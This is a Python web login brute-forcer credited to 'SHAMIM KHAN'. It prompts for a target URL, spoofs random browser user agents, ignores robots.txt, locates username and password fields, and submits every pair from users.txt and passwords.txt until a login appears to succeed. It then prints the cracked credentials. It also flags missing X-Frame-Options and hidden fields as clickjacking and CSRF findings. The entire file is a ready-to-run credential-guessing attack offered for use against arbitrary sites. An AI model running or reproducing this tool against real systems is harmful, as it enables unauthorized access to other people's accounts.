#!/usr/bin/env python2
#Modules
import requests
import random
import mechanize
import itertools
import http.cookiejar
import sys
from bs4 import BeautifulSoup
from re import search, findall
from urllib.request import urlopen
user_agent_list = [
   #Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    #Firefox
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
]
#Stuff related to Mechanize browser module
br = mechanize.Browser() #Shortening the call by assigning it to a varaible "br"
# set cookies
cookies = http.cookiejar.LWPCookieJar()
br.set_cookiejar(cookies)
# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)

# Banner
print ("\n#####################################")
print ("# => LOGIN BRUTE-FORCER<= #")
print ("# By SHAMIM KHAN          #")
print ("#####################################")
user_agent = random.choice(user_agent_list)
br.addheaders = [('User-agent', user_agent),('Accept','*/*'), ('Accept-Encoding','br')]
url = input('Enter target URL: ') #takes input from user
if 'http://' in url:
    pass
elif 'https://' in url:
    url = url.replace('https://', 'http://')
else:
    url = 'http://' + url
try:
    br.open(url, timeout=10.0) #Opens the url
except Exception as e:
    print ("Check URL format and Try again !")
    sys.exit(0)

forms = br.forms() #Finds all the forms present in webpage

headers = str(urlopen(url).headers).lower() #Fetches headers of webpage
print("User-Agent Sent:%s"%(user_agent))
print("-------------------\n\n")

if 'x-frame-options:' not in headers:
    print( 'Heuristic found a Clickjacking Vulnerability')
if 'cloudflare-nginx' in headers:
    print( 'Target is protected by Cloudflare')
data = br.open(url).read() #Reads the response

if 'type="hidden"'not in data.decode():
    print( 'Heuristic found a CSRF Vulnerability')

data = data.decode()

soup =  BeautifulSoup(data, 'lxml') #Pareses the response with beuatiful soup
i_title = soup.find('title') #finds the title tag
if i_title != None:
    original = i_title.contents #value of title tag is assigned to 'original'


def wordlist_u(lst): #Loads usernames from usernames.txt
    try:
        with open('users.txt','r') as f:
            for line in f:
                final = str(line.replace("\n",""))
                lst.append(final)
    except IOError:
        print( "Wordlist not found!")
        quit()
def wordlist_p(lst): #Loads passwords from passwords.txt
    try:
        with open('passwords.txt','r') as f:
            for line in f:
                final = str(line.replace("\n",""))
                lst.append(final)
    except IOError:
        print("Wordlist not found!")
        quit()

usernames = []
wordlist_u(usernames)
print( 'Usernames loaded: %i'% len(usernames))

passwords = []
wordlist_p(passwords)
print( 'Passwords loaded: %i'% + len(passwords))


def find(): #Function for finding forms
    form_number = 0
    for f in forms: #Finds all the forms in the webpage
        data = str(f) #Converts the response recieved to string
        username = search(r'<TextControl\([^<]*=\)>', data) #Searches for fields that accept plain text

        if username: #if such field is found
            username = (username.group().split('<TextControl(')[1][:-3]) #Extractst the name of field
            print( 'Username field: ' + username )#print(s name of field
            passwd = search(r'<PasswordControl\([^<]*=\)>', data) #Searchs for fields that accept password like text

            if passwd: #if such field is found
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3]) #Extracts the field name
                print( 'Password field: ' + passwd )#print(s name of field
                select_n = search(r'SelectControl\([^<]*=', data) #checks for other selectable menus in form
 
                if select_n: #if a menu is found
                    name = (select_n.group().split('(')[1][:-1]) #Extracts the menu name
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data) #select_o is the name of menu

                    if select_o: #Proceeds to find options of menu
                        menu = "True" #Sets the menu to be true
                        options = (select_o.group().split('=')[1][:-1]) #Extracts options
                        option = input('Please Select an option:>> ') #Gets option from user
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    else:
                        menu = "False" #No menu is present in the form
                        try:
                            brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                        except Exception as e:
                            cannotUseBruteForce(username, str(e))
                            pass							
                else:
                    menu = "False" #No menu is present in the form
                    option = "" #Sets option to null
                    name = "" #Sets name to null
                    try:
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    except Exception as e:
                       cannotUseBruteForce(username, str(e))
                       pass
            else:
                form_number = form_number + 1
                pass
        else:
            form_number = form_number + 1
            pass
    print( 'No forms found')
def cannotUseBruteForce(username, e):
    print( 'Cannot use brute force with user %s.' % username)
    print( '\r    [Error: %s]' % e)	
def brute(username, passwd, menu, option, name, form_number):
    print (form_number)
    for uname in usernames:
        progress = 1
        print( 'Bruteforcing username: %s'% uname)
        for password in passwords:
            sys.stdout.write('Passwords tried: %i / %i'% (progress, len(passwords)))
            sys.stdout.flush()
            print(' -> ',url)

            br.open(url)  
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "False":
                pass
            elif menu == "True":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.read()
            data_low = data.lower().decode()
            
            if 'username or password' in data_low:
                pass
            else:
                soup =  BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title == None:
                    data = data.lower()
                    if 'logout' in data:
                        print( '\nValid credentials found: ')
                        print( uname)
                        print( password)
                        quit()
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print( '\nValid credentials found: ')
                        print( 'Username: ' + uname)
                        print( 'Password: ' + password)
                        quit()
                    else:
                        pass
            progress = progress + 1
        print( '')
    print( 'Failed to crack login credentials')
    quit()


find()

